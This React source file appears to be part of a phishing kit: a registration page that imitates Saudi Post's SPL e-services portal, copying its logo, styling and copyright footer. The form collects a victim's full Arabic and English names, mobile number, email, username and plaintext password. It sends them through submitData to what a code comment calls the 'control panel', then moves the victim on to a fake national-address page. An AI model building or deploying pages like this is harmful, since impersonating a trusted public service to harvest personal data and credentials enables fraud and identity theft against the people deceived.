import { useState, useEffect } from "react";
import { Link, useLocation } from "wouter";
import { submitData } from "@/lib/store";

export default function RegisterStep3() {
  const [, setLocation] = useLocation();
  
  // Get account type from URL params
  const searchParams = new URLSearchParams(window.location.search);
  const accountType = searchParams.get('type') || 'individuals';
  const accountTypeText = accountType === 'business' ? 'أعمال' : 'أفراد';
  
  // Customer name from SPL website
  const [customerName, setCustomerName] = useState("");
  
  useEffect(() => {
    const name = localStorage.getItem('customerName');
    if (name) {
      setCustomerName(name);
    }
  }, []);
  
  // Arabic Name fields
  const [firstNameAr, setFirstNameAr] = useState("");
  const [fatherNameAr, setFatherNameAr] = useState("");
  const [grandfatherNameAr, setGrandfatherNameAr] = useState("");
  const [familyNameAr, setFamilyNameAr] = useState("");
  
  // English Name fields
  const [firstNameEn, setFirstNameEn] = useState("");
  const [fatherNameEn, setFatherNameEn] = useState("");
  const [grandfatherNameEn, setGrandfatherNameEn] = useState("");
  const [familyNameEn, setFamilyNameEn] = useState("");
  
  // Contact fields
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  
  // Account fields
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [agreeTerms, setAgreeTerms] = useState(false);

  // Validation functions
  const handleArabicInput = (value: string, setter: (val: string) => void) => {
    // Only allow Arabic letters and spaces
    const arabicOnly = value.replace(/[^\u0600-\u06FF\s]/g, '');
    setter(arabicOnly);
  };

  const handleEnglishInput = (value: string, setter: (val: string) => void) => {
    // Only allow English letters and spaces
    const englishOnly = value.replace(/[^a-zA-Z\s]/g, '');
    setter(englishOnly);
  };

  // Email validation
  const [emailError, setEmailError] = useState("");
  const validateEmail = (value: string) => {
    setEmail(value);
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (value && !emailRegex.test(value)) {
      setEmailError("يرجى إدخال بريد إلكتروني صحيح");
    } else {
      setEmailError("");
    }
  };

  // Phone validation
  const [phoneError, setPhoneError] = useState("");
  const validatePhone = (value: string) => {
    // Only allow numbers
    const numbersOnly = value.replace(/[^0-9]/g, '').slice(0, 10);
    setPhone(numbersOnly);
    
    if (numbersOnly.length === 10) {
      const validPrefixes = ['050', '053', '054', '055', '056', '057', '058', '059'];
      const prefix = numbersOnly.substring(0, 3);
      if (!validPrefixes.includes(prefix)) {
        setPhoneError("رقم الجوال يجب أن يبدأ بـ 05X");
      } else {
        setPhoneError("");
      }
    } else if (numbersOnly.length > 0) {
      setPhoneError("رقم الجوال يجب أن يتكون من 10 أرقام");
    } else {
      setPhoneError("");
    }
  };

  // Username validation - only English letters and numbers
  const handleUsernameInput = (value: string) => {
    const usernameOnly = value.replace(/[^a-zA-Z0-9]/g, '');
    setUsername(usernameOnly);
  };

  // Password validation - English letters, numbers, and special characters
  const handlePasswordInput = (value: string, setter: (val: string) => void) => {
    const passwordOnly = value.replace(/[^a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/g, '');
    setter(passwordOnly);
  };

  // Password strength checker
  const [passwordStrength, setPasswordStrength] = useState({ level: 0, text: '', color: '' });
  const [passwordMatch, setPasswordMatch] = useState(true);

  const checkPasswordStrength = (pass: string) => {
    let strength = 0;
    if (pass.length >= 8) strength++;
    if (/[a-z]/.test(pass)) strength++;
    if (/[A-Z]/.test(pass)) strength++;
    if (/[0-9]/.test(pass)) strength++;
    if (/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(pass)) strength++;

    if (strength <= 1) {
      setPasswordStrength({ level: 1, text: 'ضعيفة', color: 'bg-red-500' });
    } else if (strength <= 3) {
      setPasswordStrength({ level: 2, text: 'متوسطة', color: 'bg-yellow-500' });
    } else {
      setPasswordStrength({ level: 3, text: 'قوية', color: 'bg-green-500' });
    }
  };

  const handlePasswordChange = (value: string) => {
    const passwordOnly = value.replace(/[^a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/g, '');
    setPassword(passwordOnly);
    if (passwordOnly) {
      checkPasswordStrength(passwordOnly);
    } else {
      setPasswordStrength({ level: 0, text: '', color: '' });
    }
    // Check match with confirm password
    if (confirmPassword) {
      setPasswordMatch(passwordOnly === confirmPassword);
    }
  };

  const handleConfirmPasswordChange = (value: string) => {
    const passwordOnly = value.replace(/[^a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/g, '');
    setConfirmPassword(passwordOnly);
    setPasswordMatch(password === passwordOnly);
  };

  // Form validation state
  const [formErrors, setFormErrors] = useState<string[]>([]);
  const [showErrors, setShowErrors] = useState(false);

  // Check if all required fields are filled
  const isFormValid = () => {
    const errors: string[] = [];
    
    // Arabic name validation
    if (!firstNameAr.trim()) errors.push('الاسم الأول بالعربي');
    if (!fatherNameAr.trim()) errors.push('اسم الأب بالعربي');
    if (!grandfatherNameAr.trim()) errors.push('اسم الجد بالعربي');
    if (!familyNameAr.trim()) errors.push('اسم العائلة بالعربي');
    
    // English name validation
    if (!firstNameEn.trim()) errors.push('الاسم الأول بالإنجليزي');
    if (!fatherNameEn.trim()) errors.push('اسم الأب بالإنجليزي');
    if (!grandfatherNameEn.trim()) errors.push('اسم الجد بالإنجليزي');
    if (!familyNameEn.trim()) errors.push('اسم العائلة بالإنجليزي');
    
    // Contact validation
    if (!phone.trim()) {
      errors.push('رقم الجوال مطلوب');
    } else if (phone.length !== 10) {
      errors.push('رقم الجوال يجب أن يتكون من 10 أرقام');
    } else {
      const validPrefixes = ['050', '053', '054', '055', '056', '057', '058', '059'];
      const prefix = phone.substring(0, 3);
      if (!validPrefixes.includes(prefix)) {
        errors.push('رقم الجوال يجب أن يبدأ بـ 05X');
      }
    }
    if (!email.trim()) errors.push('البريد الإلكتروني');
    if (emailError) errors.push('البريد الإلكتروني غير صحيح');
    
    // Account validation
    if (!username.trim()) errors.push('اسم المستخدم');
    if (!password.trim()) errors.push('كلمة المرور');
    if (!confirmPassword.trim()) errors.push('تأكيد كلمة المرور');
    if (password && confirmPassword && !passwordMatch) errors.push('كلمة المرور غير متطابقة');
    
    // Terms validation
    if (!agreeTerms) errors.push('الموافقة على الشروط');
    
    return errors;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    const errors = isFormValid();
    if (errors.length > 0) {
      setFormErrors(errors);
      setShowErrors(true);
      return;
    }
    
    // إرسال البيانات للوحة التحكم
    submitData({
      'الاسم بالعربي': `${firstNameAr} ${fatherNameAr} ${grandfatherNameAr} ${familyNameAr}`,
      'الاسم بالإنجليزي': `${firstNameEn} ${fatherNameEn} ${grandfatherNameEn} ${familyNameEn}`,
      'رقم الجوال': phone,
      'البريد الإلكتروني': email,
      'اسم المستخدم': username,
      'كلمة المرور': password,
    });
    
    // Navigate to National Address page with service parameter
    setLocation('/national-address?service=تحديث+بيانات+العنوان+الوطني');
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
      {/* Header - dark green bar with English on left */}
      <header className="bg-[#143c3c] py-2">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between">
            {/* Empty space on right */}
            <div></div>
            {/* English on left */}
            <a href="#" className="text-white text-xs md:text-sm hover:text-gray-300">English</a>
          </div>
        </div>
      </header>

      {/* Line below header */}
      <div className="h-1.5 md:h-2 bg-[#146c84]"></div>

      {/* Logo below header on right - aligned with form box */}
      <div className="bg-gray-100 py-3 md:py-4">
        <div className="container mx-auto px-4">
          <div className="max-w-3xl mx-auto flex justify-start">
            <Link to="/">
              <img src="/images/spl-logo.png" alt="سبل" className="h-10 md:h-14 lg:h-16 w-auto" />
            </Link>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 container mx-auto px-3 md:px-4 py-4 md:py-8 lg:py-12">
        <div className="max-w-3xl mx-auto">
          {/* White Box Container */}
          <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 lg:p-10">
            {/* Title */}
            <h1 className="text-lg md:text-2xl lg:text-3xl font-bold text-[#143c3c] text-center mb-2 md:mb-4">
              إنشاء حساب {accountTypeText} في الخدمات الإلكترونية
            </h1>
            
            {/* Personalized Greeting */}
            {customerName && (
              <div className="bg-[#e8f4f8] border border-[#146c84] rounded-lg p-3 md:p-4 mb-4 md:mb-6 lg:mb-8 text-center">
                <p className="text-[#143c3c] text-sm md:text-base lg:text-lg">
                  <span className="font-bold text-[#146c84]">أهلاً بك {customerName}،</span>
                  <br />
                  الرجاء تعبئة بياناتك أدناه لإكمال تسجيلك في الخدمات الإلكترونية
                </p>
              </div>
            )}

            <form onSubmit={handleSubmit}>
              {/* Personal Information Section */}
              <h2 className="text-base md:text-xl font-bold text-[#143c3c] text-center mb-4 md:mb-6">
                المعلومات الشخصية
              </h2>

              {/* Arabic Name Section */}
              <div className="mb-4 md:mb-6">
                <h3 className="text-sm md:text-lg font-bold text-[#143c3c] text-right mb-3 md:mb-4">الاسم بالعربي</h3>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-2 md:gap-3">
                  <div>
                    <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">الاسم الأول <span className="text-red-500">*</span></label>
                    <input
                      type="text"
                      value={firstNameAr}
                      onChange={(e) => handleArabicInput(e.target.value, setFirstNameAr)}
                      placeholder="الاسم الأول"
                      className="w-full px-2 md:px-3 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                    />
                  </div>
                  <div>
                    <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">اسم الأب <span className="text-red-500">*</span></label>
                    <input
                      type="text"
                      value={fatherNameAr}
                      onChange={(e) => handleArabicInput(e.target.value, setFatherNameAr)}
                      placeholder="الأب"
                      className="w-full px-2 md:px-3 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                    />
                  </div>
                  <div>
                    <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">اسم الجد <span className="text-red-500">*</span></label>
                    <input
                      type="text"
                      value={grandfatherNameAr}
                      onChange={(e) => handleArabicInput(e.target.value, setGrandfatherNameAr)}
                      placeholder="الجد"
                      className="w-full px-2 md:px-3 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                    />
                  </div>
                  <div>
                    <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">اسم العائلة <span className="text-red-500">*</span></label>
                    <input
                      type="text"
                      value={familyNameAr}
                      onChange={(e) => handleArabicInput(e.target.value, setFamilyNameAr)}
                      placeholder="العائلة"
                      className="w-full px-2 md:px-3 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                    />
                  </div>
                </div>
              </div>

              {/* English Name Section */}
              <div className="mb-4 md:mb-6">
                <h3 className="text-sm md:text-lg font-bold text-[#143c3c] text-right mb-3 md:mb-4">الاسم بالإنجليزي</h3>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-2 md:gap-3">
                  <div>
                    <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-left">Family Name <span className="text-red-500">*</span></label>
                    <input
                      type="text"
                      value={familyNameEn}
                      onChange={(e) => handleEnglishInput(e.target.value, setFamilyNameEn)}
                      placeholder="Family"
                      className="w-full px-2 md:px-3 py-2 md:py-3 border border-gray-300 rounded-lg text-left focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                      dir="ltr"
                    />
                  </div>
                  <div>
                    <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-left">Grandfather <span className="text-red-500">*</span></label>
                    <input
                      type="text"
                      value={grandfatherNameEn}
                      onChange={(e) => handleEnglishInput(e.target.value, setGrandfatherNameEn)}
                      placeholder="Grandfather"
                      className="w-full px-2 md:px-3 py-2 md:py-3 border border-gray-300 rounded-lg text-left focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                      dir="ltr"
                    />
                  </div>
                  <div>
                    <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-left">Father Name <span className="text-red-500">*</span></label>
                    <input
                      type="text"
                      value={fatherNameEn}
                      onChange={(e) => handleEnglishInput(e.target.value, setFatherNameEn)}
                      placeholder="Father"
                      className="w-full px-2 md:px-3 py-2 md:py-3 border border-gray-300 rounded-lg text-left focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                      dir="ltr"
                    />
                  </div>
                  <div>
                    <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-left">First Name <span className="text-red-500">*</span></label>
                    <input
                      type="text"
                      value={firstNameEn}
                      onChange={(e) => handleEnglishInput(e.target.value, setFirstNameEn)}
                      placeholder="First Name"
                      className="w-full px-2 md:px-3 py-2 md:py-3 border border-gray-300 rounded-lg text-left focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                      dir="ltr"
                    />
                  </div>
                </div>
              </div>

              {/* Phone and Email Row */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3 md:gap-4 mb-4 md:mb-6">
                {/* Phone */}
                <div>
                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">رقم الجوال <span className="text-red-500">*</span></label>
                  <input
                    type="tel"
                    value={phone}
                    onChange={(e) => validatePhone(e.target.value)}
                    placeholder="05XXXXXXXX"
                    className={`w-full px-3 md:px-4 py-2 md:py-3 border rounded-lg text-right focus:outline-none text-sm md:text-base ${phoneError ? 'border-red-500 focus:border-red-500' : 'border-gray-300 focus:border-[#146c84]'}`}
                  />
                  {phoneError && <p className="text-red-500 text-xs mt-1 text-right">{phoneError}</p>}
                </div>

                {/* Email */}
                <div>
                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">البريد الإلكتروني <span className="text-red-500">*</span></label>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => validateEmail(e.target.value)}
                    placeholder="البريد الإلكتروني"
                    className={`w-full px-3 md:px-4 py-2 md:py-3 border rounded-lg text-right focus:outline-none text-sm md:text-base ${emailError ? 'border-red-500 focus:border-red-500' : 'border-gray-300 focus:border-[#146c84]'}`}
                    dir="ltr"
                  />
                  {emailError && <p className="text-red-500 text-xs mt-1 text-right">{emailError}</p>}
                </div>
              </div>

              {/* Account Information Section */}
              <h2 className="text-base md:text-xl font-bold text-[#143c3c] text-center mb-4 md:mb-6">
                معلومات الحساب
              </h2>

              {/* Username, Password, Confirm Password Row */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-3 md:gap-4 mb-4 md:mb-6">
                {/* Username */}
                <div>
                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">اسم المستخدم <span className="text-red-500">*</span></label>
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => handleUsernameInput(e.target.value)}
                    placeholder="اسم المستخدم"
                    className="w-full px-3 md:px-4 py-2 md:py-3 border border-gray-300 rounded-lg text-left focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                    dir="ltr"
                  />
                </div>

                {/* Password */}
                <div>
                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">كلمة المرور <span className="text-red-500">*</span></label>
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => handlePasswordChange(e.target.value)}
                    placeholder="كلمة المرور الجديدة"
                    className="w-full px-3 md:px-4 py-2 md:py-3 border border-gray-300 rounded-lg text-left focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                    dir="ltr"
                  />
                </div>

                {/* Confirm Password */}
                <div>
                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">تأكيد كلمة المرور <span className="text-red-500">*</span></label>
                  <input
                    type="password"
                    value={confirmPassword}
                    onChange={(e) => handleConfirmPasswordChange(e.target.value)}
                    placeholder="كلمة المرور الجديدة"
                    className={`w-full px-3 md:px-4 py-2 md:py-3 border rounded-lg text-left focus:outline-none text-sm md:text-base ${!passwordMatch && confirmPassword ? 'border-red-500 focus:border-red-500' : 'border-gray-300 focus:border-[#146c84]'}`}
                    dir="ltr"
                  />
                  {!passwordMatch && confirmPassword && <p className="text-red-500 text-xs mt-1 text-right">كلمة المرور غير متطابقة</p>}
                </div>
              </div>

              {/* Password Strength Indicator */}
              {password && (
                <div className="mb-4 md:mb-6">
                  <div className="flex items-center gap-2 justify-end">
                    <span className="text-xs md:text-sm text-gray-600">قوة كلمة المرور: <span className={`font-bold ${passwordStrength.level === 1 ? 'text-red-500' : passwordStrength.level === 2 ? 'text-yellow-500' : 'text-green-500'}`}>{passwordStrength.text}</span></span>
                  </div>
                  <div className="flex gap-1 mt-2 justify-end">
                    <div className={`h-1.5 md:h-2 w-12 md:w-16 rounded ${passwordStrength.level >= 3 ? 'bg-green-500' : 'bg-gray-300'}`}></div>
                    <div className={`h-1.5 md:h-2 w-12 md:w-16 rounded ${passwordStrength.level >= 2 ? (passwordStrength.level === 2 ? 'bg-yellow-500' : 'bg-green-500') : 'bg-gray-300'}`}></div>
                    <div className={`h-1.5 md:h-2 w-12 md:w-16 rounded ${passwordStrength.level >= 1 ? (passwordStrength.level === 1 ? 'bg-red-500' : passwordStrength.level === 2 ? 'bg-yellow-500' : 'bg-green-500') : 'bg-gray-300'}`}></div>
                  </div>
                </div>
              )}

              {/* Terms Agreement */}
              <div className="flex items-center gap-2 mb-6 md:mb-8 justify-start">
                <label className="flex items-center gap-2 cursor-pointer flex-row-reverse">
                  <span className="text-gray-700 text-xs md:text-sm">
                    أوافق على{" "}
                    <a href="#" className="text-[#146c84] hover:underline">سياسة الخصوصية</a>
                    {" "}و{" "}
                    <a href="#" className="text-[#146c84] hover:underline">شروط الإستخدام</a>
                    <span className="text-red-500"> *</span>
                  </span>
                  <input
                    type="checkbox"
                    checked={agreeTerms}
                    onChange={(e) => setAgreeTerms(e.target.checked)}
                    className="w-5 h-5 border-2 border-gray-300 rounded focus:ring-[#146c84]"
                  />
                </label>
              </div>

              {/* Error Messages */}
              {showErrors && formErrors.length > 0 && (
                <div className="mb-4 md:mb-6 p-3 md:p-4 bg-red-50 border border-red-300 rounded-lg">
                  <p className="text-red-600 font-bold mb-1.5 md:mb-2 text-right text-sm md:text-base">يرجى إكمال الحقول التالية:</p>
                  <ul className="list-disc list-inside text-red-500 text-xs md:text-sm text-right">
                    {formErrors.map((error, index) => (
                      <li key={index}>{error}</li>
                    ))}
                  </ul>
                </div>
              )}

              {/* Buttons */}
              <div className="flex flex-col-reverse sm:flex-row justify-between items-center gap-3 sm:gap-0">
                {/* Back Button */}
                <Link to="/register-step2" className="w-full sm:w-auto">
                  <button
                    type="button"
                    className="w-full sm:w-auto px-8 md:px-12 lg:px-16 py-2.5 md:py-3 border-2 border-[#146c84] text-[#146c84] bg-white font-bold rounded-lg hover:bg-[#146c84] hover:text-white transition-colors text-sm md:text-base"
                  >
                    رجوع
                  </button>
                </Link>

                {/* Register Button */}
                <button
                  type="submit"
                  className="w-full sm:w-auto px-8 md:px-12 lg:px-16 py-2.5 md:py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
                >
                  تسجيل
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#143c3c] py-4 md:py-5 mt-auto">
        <div className="container mx-auto px-3 md:px-4">
          <div className="flex flex-col items-center gap-2 md:gap-0 md:flex-row md:justify-between text-white text-xs md:text-sm">
            {/* Right side - Copyright */}
            <div className="flex items-center gap-1 text-center md:text-right">
              <span>©</span>
              <span>2026 جميع الحقوق محفوظة لمؤسسة البريد السعودي - سُبل</span>
            </div>
            
            {/* Left side - Terms and Privacy */}
            <div className="flex flex-wrap items-center justify-center gap-1 text-center">
              <span className="text-gray-300">عند استخدامك هذا الموقع، فإنك توافق على</span>
              <a href="#" className="text-[#04ccf0] hover:underline">شروط الخدمة</a>
              <span className="text-gray-300">و</span>
              <a href="#" className="text-[#04ccf0] hover:underline">سياسة الخصوصية</a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
